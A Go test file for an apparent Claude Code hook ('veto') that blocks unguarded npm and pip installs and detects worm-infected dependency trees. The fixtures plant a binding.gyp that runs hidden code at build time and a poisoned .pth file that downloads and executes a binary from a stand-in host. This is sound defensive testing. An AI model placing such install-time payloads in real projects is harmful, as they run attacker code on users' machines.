package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/require"
)

// TestRunClaudeCodeHook_RiskyEmitsDenyWithCorrectedPrefix is the most
// important behavior to nail down: a bash command that reaches a covered
// package manager produces a deny envelope whose message contains the
// `veto <pm> <args>` correction so the agent can re-issue cleanly.
func TestRunClaudeCodeHook_RiskyEmitsDenyWithCorrectedPrefix(t *testing.T) {
	withVetoOnPath(t)

	in := encodePayload(t, "Bash", "npm install lodash")
	var out bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
	require.Equal(t, exitOK, rc)

	decision := decodeDecision(t, &out)
	require.Equal(t, "deny", decision.PermissionDecision)
	require.Contains(t, decision.PermissionDecisionReason, "veto npm install lodash")
	require.Contains(t, decision.PermissionDecisionReason, "blocked unguarded `npm`")
}

// TestRunClaudeCodeHook_AllowsVetoPrefixed: agent already added the
// prefix; we must not deny a second time, or we'd loop forever.
func TestRunClaudeCodeHook_AllowsVetoPrefixed(t *testing.T) {
	withVetoOnPath(t)

	in := encodePayload(t, "Bash", "veto npm install lodash")
	var out bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
	require.Equal(t, exitOK, rc)
	require.Empty(t, strings.TrimSpace(out.String()), "no envelope should be emitted for already-guarded commands")
}

// TestRunClaudeCodeHook_NonBashIgnored: the hook only cares about Bash
// tool calls. Other tool types pass through with no envelope.
func TestRunClaudeCodeHook_NonBashIgnored(t *testing.T) {
	in := encodePayload(t, "Edit", "npm install lodash") // command field present but tool is Edit
	var out bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
	require.Equal(t, exitOK, rc)
	require.Empty(t, strings.TrimSpace(out.String()))
}

// TestRunClaudeCodeHook_MalformedInput: invalid JSON => let the tool
// proceed (we can't tell what it is; same behavior as the Python original).
func TestRunClaudeCodeHook_MalformedInput(t *testing.T) {
	in := strings.NewReader("not json at all")
	var out bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
	require.Equal(t, exitOK, rc)
	require.Empty(t, strings.TrimSpace(out.String()))
}

// TestRunClaudeCodeHook_VetoNotOnPath: when veto can't be found by
// the agent's re-invocation, telling them to add a prefix is useless. We
// must still deny but with a "do not retry" message.
func TestRunClaudeCodeHook_VetoNotOnPath(t *testing.T) {
	// Empty PATH guarantees lookup fails.
	t.Setenv("PATH", "")

	in := encodePayload(t, "Bash", "npm install lodash")
	var out bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
	require.Equal(t, exitOK, rc)

	decision := decodeDecision(t, &out)
	require.Equal(t, "deny", decision.PermissionDecision)
	require.Contains(t, decision.PermissionDecisionReason, "veto binary itself was not found on PATH")
	require.Contains(t, decision.PermissionDecisionReason, "Do NOT retry")
}

// withVetoOnPath drops a fake `veto` executable into a temp dir and
// puts it on PATH for the test. Lets the reachable-check pass without
// TestRunClaudeCodeHook_BindingGypWormDeniesEarly: an npm install in a tree
// whose node_modules harbors a phantom-gyp / Miasma binding.gyp is denied
// with the worm reason, BEFORE the generic "re-run with veto" nudge — because
// prefixing with veto would not make this tree safe to install into.
func TestRunClaudeCodeHook_BindingGypWormDeniesEarly(t *testing.T) {
	withVetoOnPath(t)
	chdirToWormTree(t)

	in := encodePayload(t, "Bash", "npm install some-new-dep")
	var out bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
	require.Equal(t, exitOK, rc)

	d := decodeDecision(t, &out)
	require.Equal(t, "deny", d.PermissionDecision)
	require.Contains(t, d.PermissionDecisionReason, "binding.gyp worm pattern detected")
	require.Contains(t, d.PermissionDecisionReason, "gyp-command-in-sources")
	// It must NOT be the generic prefix nudge — the worm reason supersedes it.
	require.NotContains(t, d.PermissionDecisionReason, "Re-run with an explicit")
}

func TestRunClaudeCodeHook_BindingGypWormPrefixTargetDeniesEarly(t *testing.T) {
	withVetoOnPath(t)
	cwd := t.TempDir()
	target := t.TempDir()
	chdirForTest(t, cwd)

	pkg := filepath.Join(target, "node_modules", "innocent-util")
	writeGypFixture(t, filepath.Join(pkg, "binding.gyp"), wormBindingGyp)
	writeGypFixture(t, filepath.Join(pkg, "package.json"), `{"name":"innocent-util"}`)
	writeGypFixture(t, filepath.Join(pkg, "index.js"), "// blob")

	in := encodePayload(t, "Bash", "npm install --prefix "+target+" some-new-dep")
	var out bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), in, &out)
	require.Equal(t, exitOK, rc)

	d := decodeDecision(t, &out)
	require.Equal(t, "deny", d.PermissionDecision)
	require.Contains(t, d.PermissionDecisionReason, "binding.gyp worm pattern detected")
	require.Contains(t, d.PermissionDecisionReason, "gyp-command-in-sources")
	require.NotContains(t, d.PermissionDecisionReason, "Re-run with an explicit")
}

// chdirToWormTree creates a temp project tree with a worm-bearing binding.gyp
// in node_modules and chdirs into it for the duration of the test.
func chdirToWormTree(t *testing.T) {
	t.Helper()
	root := t.TempDir()
	pkg := filepath.Join(root, "node_modules", "innocent-util")
	require.NoError(t, os.MkdirAll(pkg, 0o755))
	gyp := `{ "targets": [{ "target_name": "Setup", "type": "none", "sources": ["<!(node index.js >/dev/null 2>&1 && echo stub.c)"] }] }`
	require.NoError(t, os.WriteFile(filepath.Join(pkg, "binding.gyp"), []byte(gyp), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(pkg, "package.json"), []byte(`{"name":"innocent-util"}`), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(pkg, "index.js"), []byte("// blob"), 0o644))

	prev, err := os.Getwd()
	require.NoError(t, err)
	require.NoError(t, os.Chdir(root))
	t.Cleanup(func() { _ = os.Chdir(prev) })
}

// requiring veto to be installed system-wide.
func withVetoOnPath(t *testing.T) {
	t.Helper()
	dir := t.TempDir()
	vetoPath := filepath.Join(dir, "veto")
	require.NoError(t, os.WriteFile(vetoPath, []byte("#!/bin/sh\nexit 0\n"), 0o755))
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
}

func encodePayload(t *testing.T, tool, cmd string) *bytes.Reader {
	t.Helper()
	buf, err := json.Marshal(map[string]any{
		"tool_name":  tool,
		"tool_input": map[string]any{"command": cmd},
	})
	require.NoError(t, err)
	return bytes.NewReader(buf)
}

type decision struct {
	PermissionDecision       string
	PermissionDecisionReason string
}

func decodeDecision(t *testing.T, buf *bytes.Buffer) decision {
	t.Helper()
	var env claudeHookOutput
	require.NoError(t, json.Unmarshal(buf.Bytes(), &env))
	require.Equal(t, "PreToolUse", env.HookSpecificOutput.HookEventName)
	return decision{
		PermissionDecision:       env.HookSpecificOutput.PermissionDecision,
		PermissionDecisionReason: env.HookSpecificOutput.PermissionDecisionReason,
	}
}

func TestClaudeCodeHookDeniesPipInstallInPoisonedVenv(t *testing.T) {
	root := t.TempDir()
	site := filepath.Join(root, ".venv", "lib", "python3.11", "site-packages")
	require.NoError(t, os.MkdirAll(site, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(site, "ensmallen-setup.pth"),
		[]byte(`import urllib.request, subprocess; urllib.request.urlretrieve('https://x/bun','/tmp/bun'); subprocess.Popen(['/tmp/bun'])`+"\n"),
		0o644))

	// Run the hook from inside `root` so its cwd-relative venv discovery
	// finds the poisoned venv.
	t.Chdir(root)

	stdin := bytes.NewBufferString(`{"tool_name":"Bash","tool_input":{"command":"pip install ensmallen"}}`)
	var stdout bytes.Buffer
	rc := runClaudeCodeHook(zerolog.Nop(), stdin, &stdout)
	require.Equal(t, 0, rc)
	require.True(t, strings.Contains(stdout.String(), "Hades"), "expected Hades in deny reason; got %q", stdout.String())
	require.True(t, strings.Contains(stdout.String(), `"deny"`), "expected deny envelope; got %q", stdout.String())
}
